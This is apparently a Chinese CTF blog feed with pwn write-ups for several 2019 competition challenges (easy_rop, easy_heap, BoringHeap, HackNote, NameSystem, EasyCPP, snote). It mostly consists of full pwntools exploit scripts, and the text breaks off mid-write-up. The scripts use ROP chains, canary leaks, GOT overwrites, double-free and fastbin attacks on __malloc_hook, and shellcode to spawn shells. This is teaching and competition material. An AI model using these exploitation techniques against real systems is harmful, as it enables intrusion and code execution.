*context.arch = &#39;amd64&#39;context.os = &#39;linux&#39;rdi_ret = 0x400bc3rsi_r15_ret = 0x400bc1rbp_ret = 0x400970puts_got = 0x601028puts_plt = 0x400870start_addr = 0x400910context.log_level = &#39;DEBUG&#39;sh = process(&#39;./warm_up&#39;)gdb.attach(sh)sh.recvuntil(&#39;!!!&#39;)payload = &#39;a&#39;* 0x18sh.sendline(payload)content = sh.recvuntil(&#39;?&#39;)canary = u64(&#39;\x00&#39; + content[26:33])log.info(&#39;canary = &#39;+hex(canary))payload = &#39;a&#39; * 0x18 + p64(canary) + p64(0) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)sh.sendline(payload)content = sh.recvuntil(&#39;\n&#39;)#log.info(content)libc_base = u64(content[:-1].ljust(8,&#39;\x00&#39;)) - 0x6f690log.success(&#39;libc_base = &#39; + hex(libc_base))sh.recvuntil(&#39;!!!&#39;)sh.sendline(&#39;aaa&#39;)sh.recvuntil(&#39;?&#39;)rdx_ret = libc_base + 0x1b92mprotect_addr = libc_base + 0x101770read_addr = libc_base + 0xf7250bss = 0x601000payload = &#39;a&#39; *0x18 + p64(canary) + p64(0)payload += p64(rdi_ret) + p64(bss)payload += p64(rsi_r15_ret) + p64(0x2000) + p64(0) payload += p64(rdx_ret) + p64(7)payload += p64(mprotect_addr) payload += p64(rdi_ret) + p64(0)payload += p64(rsi_r15_ret) + p64(bss) + p64(0)payload += p64(rdx_ret) + p64(0x100) payload += p64(read_addr)payload += p64(bss)sh.sendline(payload)shellcode = shellcraft.amd64.open(&#39;./flag&#39;)shellcode += shellcraft.amd64.read(3,bss + 0x200,0x30)shellcode += shellcraft.amd64.write(1,bss + 0x200 ,0x30)sleep(0.5)sh.send(asm(shellcode))sh.interactive()</code></pre><h1 id="easy-rop"><a href="#easy-rop" class="headerlink" title="easy_rop"></a>easy_rop</h1><p>ROP题,有意思的一点是在输入时<code>&#39;a&#39;</code>会导致直接跳过整个循环,而<code>&#39;+&#39;</code>则不会,并且视作不进行输入,知道了这一点后就很简单了,那个循环里可泄露，也可覆写,ROP即可。因为没开RELRO保护所以可以直接GOT覆写。</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *sh = process(&#39;./easy_rop&#39;)context.log_level = &#39;DEBUG&#39;#gdb.attach(sh)def set(addr):    sh.recvuntil(&#39;:&#39;)    sh.sendline(str(addr % 0x100000000))    sh.recvuntil(&#39;:&#39;)    sh.sendline(str(addr / 0x100000000))read_plt = 0x850write_plt = 0x820puts_got = 0x201238puts_plt = 0x810rsp_rrr_ret = 0xb9drdi_ret = 0xba3rsi_r15_ret = 0xba1one_gadget = 0x4526ash.recvuntil(&#39;Please input some number&#39;)for i in range(28):    sh.recvuntil(&#39;:&#39;)    sh.sendline(&#39;+&#39;)    sh.recvline()sh.recvuntil(&#39;:&#39;)sh.sendline(&quot;+&quot;)sh.recvuntil(&#39;= &#39;)leak1 = int(sh.recvuntil(&#39;\n&#39;)[:-1])if(leak1 &lt; 0):    leak1 += 0x100000000sh.recvuntil(&#39;:&#39;)sh.sendline(&#39;+&#39;)sh.recvuntil(&#39;= &#39;)leak2 = int(sh.recvuntil(&#39;\n&#39;)[:-1])if(leak2 &lt; 0):    leak2 += 0x100000000pie = (leak2 * 0x100000000 + leak1) - 0xb40log.success(&#39;base = &#39; + hex(pie))set(pie + rsp_rrr_ret)set(pie + 0x201408)sh.recvuntil(&#39;What\&#39;s your name?\n&#39;)payload = p64(pie + rdi_ret) + p64(1) + p64(pie + rsi_r15_ret) + p64(pie + puts_got) + p64(0) + p64(pie + write_plt)payload += p64(pie + rdi_ret) + p64(0) + p64(pie + rsi_r15_ret) + p64(pie + puts_got) + p64(0) + p64(pie + read_plt) payload +=p64(pie + puts_plt)sh.sendline(payload)content = sh.recv()log.info(content)libc_base = u64(content[:8]) - 0x6f690log.info(&#39;libc_base = &#39; + hex(libc_base))sh.sendline(p64(libc_base + one_gadget))sh.interactive()</code></pre><h1 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h1><p>堆题,关键点在于一开始往bss段读了个name,可以置入<code>fake_size</code>,漏洞点就是<code>double_free</code></p><pre><code class="python">from pwn import *def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;What\&#39;s your heap_size?&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;What\&#39;s your heap_content?&#39;)    sh.send(content)    sh.recvuntil(&#39;4. exit&#39;)def show(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;What\&#39;s your heap_index?&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;:&#39;)    content = sh.recvuntil(&#39;W&#39;)[1:-2]#    log.info(content)    sh.recvuntil(&#39;4. exit&#39;)    return contentdef delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;What\&#39;s your heap_index?&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;4. exit&#39;)name_addr = 0x602060one_gadget = 0xf1147sh = remote(&#39;139.129.76.65&#39; ,50001)#sh = process(&#39;./easy_heap&#39;)#gdb.attach(sh)elf = ELF(&#39;./easy_heap&#39;)puts_got = elf.got[&#39;puts&#39;]context.log_level = &#39;DEBUG&#39;sh.recvuntil(&#39;What\&#39;s your name?&#39;)name = p64(0) + p64(0x41) # fake_sizesh.send(name)sh.recvuntil(&#39;4. exit&#39;)add(0x30,&#39;aaa&#39;) #0add(0x30,&#39;bbb&#39;) #1add(0x40,&#39;ccc&#39;) #2delete(0)delete(1)delete(0) #double_freeadd(0x30,p64(name_addr)) #3add(0x30,&#39;ddd&#39;) #4add(0x30,&#39;eee&#39;) #5add(0x30,p64(0) + p64(0xff) + p64(puts_got)) #6 修改ptr(0)为puts_got,直接show()libc_base = u64(show(0).ljust(8,&#39;\x00&#39;)) - 0x6f690 #puts_offsetlog.success(&#39;libc_base = &#39; + hex(libc_base))find_fake_fast_offset = 0x23malloc_hook_addr = libc_base + 0x3c4b10add(0x60,&#39;aaa&#39;) # 7add(0x60,&#39;bbb&#39;) #8add(0x50,&#39;ccc&#39;) #9delete(7)delete(8)delete(7)add(0x60,p64(malloc_hook_addr - find_fake_fast_offset)) #10add(0x60,&#39;d&#39;) #11add(0x60,&#39;e&#39;) #12add(0x60, &#39;a&#39; *0x13 + p64(libc_base + one_gadget))sh.sendline(&#39;1&#39;)sh.sendline(&#39;32&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019上海市大学生网络安全大赛-线上赛-pwn-BoringHeap Writeup</title>
      <link href="/2019/11/16/sh2019boringheap/"/>
      <url>/2019/11/16/sh2019boringheap/</url>
      
        <content type="html"><![CDATA[<p>2019上海市大学生网络安全大赛 线上赛pwn题BoringHeap的解题过程</p><a id="more"></a><h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p><code>abs(0x80000000)</code>即int变量最小值 <code>-2147483648</code>时 因为返回值int范围无法表示<code>+2147483648</code>所以返回值还是<code>0x80000000</code>，在题目中表现为abs(0x80000000) % 0x30 = -32 因此可以在<code>edit()</code>函数中修改<code>chunk_size</code></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>因为可以修改<code>chunk_size</code>,通过修改为<code>unsorted bin</code>再<code>free</code>获取libc基地址,之后通过堆重叠先将<code>fake_size</code>置入<code>main_arena</code>然后<code>malloc()</code>获取位于<code>main_arena</code>的chunk来修改<code>last_remainder</code>为<code>malloc_hook - 0x10</code>的地址，最后<code>malloc</code>修改其为<code>one_gadget</code>地址，获取shell</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">#encoding:utf-8from pwn import *context.log_level =&#39;DEBUG&#39;main_arena_88_offset = 0x3c4b78find_fake_fast_offset = 0x23malloc_hook_offset = 0x3c4b10 one_gadget_offset = 0xf1147# size : 1 0x20 2 0x30 3 0x40def add(size,content):     sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Large&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input Content:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;5.Exit&#39;)#  abs(-0x80000000)%0x30 = -32 = -0x20def add_full_content(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Large&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input Content:&#39;)    sh.send(content)    sh.recvuntil(&#39;5.Exit&#39;)def edit(index,offset,content):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Which one do you want to update?&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Where you want to update?&#39;)    sh.sendline(str(offset))    sh.recvuntil(&#39;Input Content:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;5.Exit&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Which one do you want to delete?&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;5.Exit&#39;)def show(index):    sh.sendline(&#39;4&#39;)    sh.recvuntil(&#39;Which one do you want to view?&#39;)    sh.sendline(str(index))    recv_content = sh.recvuntil(&#39;5.Exit&#39;)    return recv_contentsh = process(&#39;./boringheap&#39;)#gdb.attach(sh)add(1,&#39;aaa&#39;) #0 add(2,&#39;bbb&#39;) #1add(3,&#39;ccc&#39;) #2add(2,&#39;ddd&#39;) #3add(2,&#39;eee&#39;) #4edit(1,0x80000000,&#39;\x00&#39; * 0x18 + p64(0xD1) )# 0xD1 = 0x40 + 0x50 + 0x40 + 1 用于堆重叠 delete(1)add(2,&#39;f&#39;) #5 切割0x41的[1] content  = show(2)libc_base = u64(content[1:7].ljust(8,&#39;\x00&#39;)) - main_arena_88_offsetlog.info(&#39;libc_base = &#39; + hex(libc_base))add(3,&#39;aaa&#39;) #6 堆重叠 地址同 [2]add(2,&#39;bbb&#39;) #7 同[3]delete(3) edit(7,0,p64(0x51)) add(2,&#39;ccc&#39;) # 将fake_size = 0x51置入main_arenadelete(2)edit(6,0,p64(libc_base + 0x3c4b20 + 0x10)) # main_arenaadd(3,&#39;aaa&#39;)add_full_content(3,p64(0) * 7 + p64(libc_base + 0x3c4b10 - 0x10)) #malloc_hookadd(3,p64(libc_base + one_gadget_offset))sh.sendline(&#39;1&#39;)sh.sendline(&#39;1&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>湖湘杯2019复赛 pwn Writeup</title>
      <link href="/2019/11/09/hxb2019pwn/"/>
      <url>/2019/11/09/hxb2019pwn/</url>
      
        <content type="html"><![CDATA[<p>摸了快一个月的湖湘杯2019复赛pwn题的解题过程</p><a id="more"></a><h1 id="HackNote"><a href="#HackNote" class="headerlink" title="HackNote"></a>HackNote</h1><p>IDA打开发现是静态编译的堆题,没开任何保护,基本操作便是add(),delete(),edit().<br>特点是将malloc得到的指针放在了栈上rsp + 0x20的位置,而size则放在了rsp + 0x20 + 16*8 = rsp + 0xa0的位置,且因为是静态编译,无法使用pwngdb中的heap/fastbins/unsorted等指令,相当于增加了调试难度.</p><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h3><p>题目中在edit时,修改新的size是用的strlen()函数,因此当我们将chunk中的内容与next_chunk的size连起来时,size就会被 + 2 因此就可以再次edit()来修改next_chunk的size</p><h3 id="堆重叠来获取main-arena-chunk"><a href="#堆重叠来获取main-arena-chunk" class="headerlink" title="堆重叠来获取main_arena_chunk"></a>堆重叠来获取main_arena_chunk</h3><p>具体过程见EXP</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">#encoding:utf-8from pwn import *sh = process(&#39;./HackNotenew&#39;)#sh = remote(&#39;183.129.189.62&#39;,21004)main_arena_88 = 0x00000000006ca858main_arena_0x61 = 0x6ca828malloc_hook = 0x6CB788chunk_ptr = 0x6cbc40context.log_level = &#39;DEBUG&#39;context(os=&quot;linux&quot;, arch=&quot;amd64&quot;)def add(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;4. Exit&#39;)def add_full(size,content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Input the Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)    sh.recvuntil(&#39;4. Exit&#39;)def delete(index):    sh.sendline(&#39;2&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;4. Exit&#39;)def edit(index,content):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;Input the Index of Note:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Input the Note:&#39;)    sh.send(content)gdb.attach(sh)sh.recvuntil(&#39;4. Exit&#39;)add(0x108,&#39;aaaa&#39;) #0 暂时不能使用off_by_oneadd(0x200,&#39;b&#39; * 0x1f0 + p64(0x200) ) #1 0x200是fake_prev_size  add(0x100,&#39;cccc&#39;) #2 next_chunkadd(0x100,&#39;dddd&#39; ) #3edit(0,&#39;a&#39; * 0x108) # 这次修改将size改为了0x10a (本来的0x108 + next_chunk的size两字节)delete(1) # [2] prev_size = 0x210 size = 0x110edit(0,&#39;a&#39; * 0x108 + &#39;\n&#39;) # [1] size = 0x200 off_by_one修改add(0xa0,&#39;eeee&#39;) #1 切割原先free的 [1] 被修改的prev_size是一开始add()时写上去的0x200add(0x50,&#39;ffff&#39;) #4 add(0x40,&#39;gggg&#39;) #5# 堆重叠的两个fastbindelete(1)delete(2) #触发合并 size = 0x321 add(0x300,&#39;hhhh&#39;) #1 覆盖[4] [5] 两个fastbindelete(4) delete(5)edit(1,&#39;\x00&#39; * 0xa8 +  p64(0x60) + p64(0x51) + p64(0) *10 + p64(0x51) + p64(0x6cb820) + &#39;\n&#39;) # [4]-&gt;fd = 0x51 目的是修改main_arena 0x6ca828这个地址的值 [5] -&gt; fd = 0x6cb820 fake_chunk_in_main_arena 的地址add(0x50, &#39;aaa&#39;) #4 此时 *0x6ca828 = 0x51add(0x40, &#39;bbb&#39;) #5 此时 *0x6ca820 = 0x6ca820add(0x40, p64(0) * 5 + p64(malloc_hook - 0x10) ) #malloc()得到0x6ca830 修改 main_arena + 88 即 last_remainder 的值为 malloc_hook -0x10 的地址add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) )add(0x40, p64(0x6cb790) + asm(shellcraft.sh()) ) #malloc()三次是因为之前的unsorted bin 还没切割完,优先级比last_remainder高sh.sendline(&#39;1&#39;)sh.sendlineafter(&quot;Input the Size:&quot;, &#39;64&#39;)sh.interactive()</code></pre><h1 id="NameSystem"><a href="#NameSystem" class="headerlink" title="NameSystem"></a>NameSystem</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>利用doublefree获取 got表 0x60200a 这一地址的fake_chunk,然后修改free()的got表低四位为system()的0x5390 ,然后free()之前申请的内容为<code>/bin/sh</code>的chunk,若地址正确是就相当于<code>system(&#39;/bin/sh&#39;)</code>然后爆破三位获取shell</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *#context.log_level =&#39;DEBUG&#39;def add(size, content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Name Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Name:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice :&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;The id you want to delete:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice :&#39;)x = 1while (1):    log.info(&#39;time =&#39; + str(x))    x+=1    sh = process(&#39;./NameSystem&#39;)    #sh = remote(&#39;183.129.189.62&#39;,15905)    sh.recvuntil(&#39;Your choice :&#39;)    for i in range(18):        add(0x40,&#39;aaa&#39;)    #gdb.attach(sh)    add(0x50,&#39;bbb&#39;)    add(0x50,&#39;ccc&#39;)    delete(0)    delete(18)    delete(17)    delete(19)    delete(0)    delete(0)    delete(0)    delete(0)    add(0x50,p64(0x601ffa))    add(0x50,&#39;\x00&#39;)    add(0x50,&#39;/bin/sh\x00&#39;)    add(0x50,&#39;\x00&#39; * 14 + &#39;\x90\x53&#39;) #最后三位0x390确定 爆破0x005这三位 &#39;\x00&#39;来自于readin()函数的实现会将&#39;\n&#39;替换成&#39;\x00&#39;     try:        sh.sendline(&#39;3&#39;)        sh.recvuntil(&#39;The id you want to delete:&#39;)        sh.sendline(str(15))        sleep(0.2)        sh.sendline(&#39;ls&#39;)        sh.recv()        sh.sendline(&#39;ls&#39;)    except EOFError:        sh.close()        continue    else:        sh.interactive()</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>先将<code>ptr[0]</code>修改为got表地址用于泄露libc地址，然后修改<code>free_got</code>为<code>puts_plt</code>，这样在<code>delete(0)</code>时就能得到libc地址,同时需要在got表段留下<code>size = 0x41</code>的fake_size用于再次修改<code>free_got</code>为<code>system</code>,此时delete()内容为<code>/bin/sh</code>的chunk就能getshell</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">#encoding:utf-8from pwn import *from LibcSearcher import LibcSearchercontext.log_level =&#39;DEBUG&#39;def add(size, content):    sh.sendline(&#39;1&#39;)    sh.recvuntil(&#39;Name Size:&#39;)    sh.sendline(str(size))    sh.recvuntil(&#39;Name:&#39;)    sh.sendline(content)    sh.recvuntil(&#39;Your choice :&#39;)def delete(index):    sh.sendline(&#39;3&#39;)    sh.recvuntil(&#39;The id you want to delete:&#39;)    sh.sendline(str(index))    sh.recvuntil(&#39;Your choice :&#39;)sh = process(&#39;./NameSystem&#39;)sh.recvuntil(&#39;Your choice :&#39;)for i in range(18):    add(0x40,&#39;aaa&#39;)#gdb.attach(sh)#三次double freeadd(0x50,&#39;bbb&#39;)add(0x50,&#39;ccc&#39;)delete(0)delete(18)delete(17)delete(19)delete(0)add(0x60,&#39;ddd&#39;)add(0x60,&#39;eee&#39;)delete(0)delete(18)delete(17)delete(19)delete(0)add(0x30,&#39;fff&#39;)add(0x30,&#39;ggg&#39;)delete(0)    delete(18)delete(17)delete(19)delete(0)for i in range(12):    delete(0)#令ptr[0] = 0x602060 即atoi_got 用于待会的puts libc地址add(0x60,p64(0x60208d))add(0x60,p64(0))add(0x60,&#39;/bin/sh\x00&#39;) # 此处/bin/sh没有特别意义add(0x60,&#39;\x00&#39;*3 + p64(0x602060)) #修改free_got 为 puts_plt add(0x50,p64(0x601ffa))add(0x50,p64(0))add(0x50,&#39;/bin/sh\x00&#39;)add(0x50,&#39;\x00&#39; * 0x6 + p64(0x41) + p32(0x4006a0) + &#39;\x00&#39; *3 ) # &#39;\x00&#39; * 0x6 + p64(0x41) 是加起来长度0xe的 padding 0x41 是为了等会再次修改free_got时malloc(0x30)留下的fake_chunk_size # p32(0x4006a0) + &#39;\x00&#39; *3 再加上会被readin()修改为&#39;\x00&#39;的&#39;\n&#39; 一共8字节 如果用p64(0x4006a0) 会越界一字节导致报错sh.sendline(&#39;3&#39;)sh.recvuntil(&#39;The id you want to delete:&#39;)sh.sendline(&#39;0&#39;)atoi_addr = u64(sh.recvuntil(&#39;\n&#39;)[:-1].ljust(8,&#39;\x00&#39;))libc = LibcSearcher(&#39;atoi&#39;,atoi_addr)libc_base = atoi_addr - libc.dump(&#39;atoi&#39;)log.info(&#39;libc_base = &#39; + hex(libc_base))system_addr = libc_base + libc.dump(&#39;system&#39;)#泄露libc地址add(0x30, p64(0x602008))add(0x30,p64(0))add(0x30,&#39;/bin/sh\x00&#39;)add(0x30,p64(system_addr)[:7] )#再次修改free_got为system_addr [:7] 也是防止越界sh.sendline(&#39;3&#39;)sh.recvuntil(&#39;The id you want to delete:&#39;)sh.sendline(&#39;15&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackergame2019 没有bug的教务系统 Writeup</title>
      <link href="/2019/11/02/hackergame2019-easyCPP-wp/"/>
      <url>/2019/11/02/hackergame2019-easyCPP-wp/</url>
      
        <content type="html"><![CDATA[<p>中科大hackergame2019里 没有bug的教务系统 的writeup</p><a id="more"></a><p>先引用一下官方的wp</p><blockquote><p><a href="https://github.com/ustclug/hackergame2019-writeups/tree/master/official/%E6%B2%A1%E6%9C%89_BUG_%E7%9A%84%E6%95%99%E5%8A%A1%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">官方writeup</a></p></blockquote><h1 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h1><p>即利用edit info中 v5的任意地址free</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>核心就在于editInfo()以及setPassword()<br><img src="https://i.loli.net/2019/11/02/UYhXblJrTtVEcjP.png" alt="setPassword"><br><img src="https://i.loli.net/2019/11/02/BXERUAtxlVcLGH7.png" alt="editInfo"><br>setPassword()中的s[]距editInfo()中v5的偏移为0x80<br><img src="https://i.loli.net/2019/11/02/2pTde9CLxwOEmAy.jpg" alt="setPassword"></p><p><img src="https://i.loli.net/2019/11/02/3REaMuLSAfpOz57.jpg" alt="editInfo"></p><blockquote><p>偏移量 = 0x7ffd3a074ba0 - 0xB0 - 0x7ffd3a074ba0 + 0x30  = - 0x80</p></blockquote><p>具体过程见EXP的注释 </p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre><code class="python">#encoding:utf-8from pwn import *password = &#39;\x44\x00\x02\x41\x43\x47\x10\x63\x00&#39;one_gadget_offset = 0xf02a4pswd_addr = 0x6032E0context.log_level = &#39;DEBUG&#39;elf =ELF(&#39;./EasyCPP&#39;)pswd = map(lambda x:ord(x) , list(password))ans = &#39;&#39;#sh = process(&#39;./EasyCPP&#39;)for i in reversed(range(8)):    for x in range(256):        if(pswd[i] == (((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) | i) &amp; ~((x | pswd[i + 1]) &amp; ~(x &amp; pswd[i + 1]) &amp; i))):            pswd[i] = x            breakans = &#39;&#39;.join(map(lambda x : chr(x) , pswd) )def edit(ps , stu):    sh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)    sh.sendafter(&#39;Your new password:&#39;,ps)    sh.sendafter(&#39;please:&#39;,stu)    sh.sendlineafter(&#39;grade(0~100):&#39;,&#39;0&#39;)    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)    sh.sendlineafter(&#39;grade:&#39;,&#39;0&#39;)sh = process(&#39;./EasyCPP&#39;)#gdb.attach(sh)sh.recvuntil(&#39;Username:&#39;)sh.sendline(&#39;admin&#39;)sh.recvuntil(&#39;Password:&#39;)sh.send(ans)payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)payload += p64(0)edit(payload,&#39;a&#39; * 0x20)# 第一次循环是为了将v4 free 置入fastbin中,因此fake chunk其实不必构造# v4是malloc(0x0B) 即 len(&#39;PB19000001&#39;) + 1 实际size = 0x21payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)payload += p64(pswd_addr + 0x10)edit(payload,&#39;a&#39;)# 第二次循环 构造size = 0x21的fake_chunk 使得在T-&gt;edit中malloc(1) 得到最小chunk# free(fake_chunk) 再在 T-&gt;edit 中将其malloc出来，且仅修改最低一字节为0x61sh.recvuntil(&#39;STUDENT: &#39;)heap_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))log.info(&#39;heap_addr = &#39; + hex(heap_addr))# 泄露heap地址 偏移固定payload = (p64(0) + p64(0x21) + p64(0)*2 +p64(0) + p64(0x21) + p64(0) *2 + p64(0) + p64(0x21) + p64(0) *2).ljust(0x80,&#39;\x00&#39;)payload += p64(heap_addr - 0x41)edit(payload ,p64(elf.got[&#39;setvbuf&#39;]))sh.recvuntil(&#39;STUDENT: &#39;)# 第三次循环 heap_addr - 0x41 = 程序开始时malloc(0x18)的T所在chunk ,fd 即为studentNum# 先将其free再在T-&gt;edit 中将其malloc出来 修改studentNum为got表地址 即可获得libc地址 libc题目已给出 偏移量已知libc_setvbuf_addr = u64(sh.recvuntil(&#39;GPA:&#39;)[:-4].ljust(8,&#39;\x00&#39;))libc_base = libc_setvbuf_addr - 0x6fe70log.info(&#39;libc_base_addr =&#39; + hex(libc_base))one_gadget = libc_base + one_gadget_offsetfind_fake_fast_offset = 0x23malloc_hook_offset = 0x3C4B10payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(pswd_addr + 0x10) + p64(0)*2 #+ &#39;\x21&#39;edit(payload,&#39;a&#39; * 0x30)# 第四次循环, 构造fake_chunk size = 0x71 用于寻找find_fake_fast# 这次循环 仅为了将bss段上的pswd地址free进fastbin链中 fd会被置0payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;edit(payload,&#39;\x00&#39; * 0x60)# 第五次循环 UAF 修改刚刚被free的fake chunk 的fd = fake_fast 然后将其malloc 此时已不必利用free(v5) 因此是p64(0)payload = p64(0) + p64(0x71) + p64(libc_base + malloc_hook_offset - find_fake_fast_offset) +p64(0) * 11 + p64(0) + p64(0x21) + p64(0) + p64(0)*2 #+ &#39;\x21&#39;edit(payload,&#39;a&#39; * 0x13 + p64(one_gadget) + &#39;\x00&#39; * 69)# 最后一次循环 malloc fake_fast a*0x13 是算上了 find_fake_fast的chunk头0x10 修改malloc_hook 为one_gadgetsh.sendlineafter(&#39;Please tell me your choice:&#39;,&#39;1&#39;)sh.sendline(&#39;1234&#39;)sh.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iChunQiu 巅峰极客2019 pwn snote Writeup</title>
      <link href="/2019/10/19/iChunQiu-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22019-pwn-snote-Writeup/"/>
      <url>/2019/10/19/iChunQiu-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22019-pwn-snote-Writeup/</url>
      
        <content type="html"><![CDATA[<p>今天打了i春秋巅峰极客2019初赛，记录一下pwn题snote的解题过程</p><a id="more"></a><h1 id="题目限制"><a href="#题目限制" class="headerlink" title="题目限制"></a>题目限制</h1><p>这道题的show和delete都只能使用一次，且edit最多修改size + 8的内容，malloc max size =0x1000，这些限制相当大。</p><h2 id="解题思路-amp-运用到的方法"><a href="#解题思路-amp-运用到的方法" class="headerlink" title="解题思路 &amp; 运用到的方法"></a>解题思路 &amp; 运用到的方法</h2><ol><li>House of Orange</li><li>UAF</li><li>Unsorted Bin Attack</li><li>Fast Bin Attack<br>主要步骤就是</li></ol><ul><li>先申请一个chunk且size为0x08结尾，这样修改size + 8时就可以修改next chunk的size</li><li>因此可以修改top chunk的size为一个小于0x1000的值(注意要对齐内存)<h3 id="对齐内存"><a href="#对齐内存" class="headerlink" title="对齐内存"></a>对齐内存</h3><blockquote><p>什么是对齐到内存页呢？我们知道现代操作系统都是以内存页为单位进行内存管理的，一般内存页的大小是 4kb。那么我们伪造的 size 就必须要对齐到这个尺寸。在覆盖之前 top chunk 的 size 大小是 20fe1，通过计算得知 0x602020+0x20fe0=0x623000 是对于 0x1000（4kb）对齐的。</p></blockquote></li></ul><blockquote><pre><code>0x602000:   0x0000000000000000  0x00000000000000210x602010:   0x0000000000000000  0x00000000000000000x602020:   0x0000000000000000  0x0000000000020fe1 &lt;== top chunk0x602030:   0x0000000000000000  0x0000000000000000</code></pre><p>因此我们伪造的 fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。而 0x40 不满足对齐，因此不能实现利用。(引用自CTF-WIKI)</p><ul><li>在修改之后，当我们申请一个size = 4096(题目限制) 的chunk时，就会触发下列机制</li></ul></blockquote><blockquote><p>当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins</p></blockquote><blockquote><p>在 glibc/malloc/malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置(就是main_arena + 某一固定offset)的地址</p><ul><li>在这道题中，就是当我们在修改top chunk size后申请size = 4096的chunk时，原top chunk就变成了unsorted bin，效果如下<br><img src="https://i.loli.net/2019/10/19/a82GTlwIosVdNPg.png" 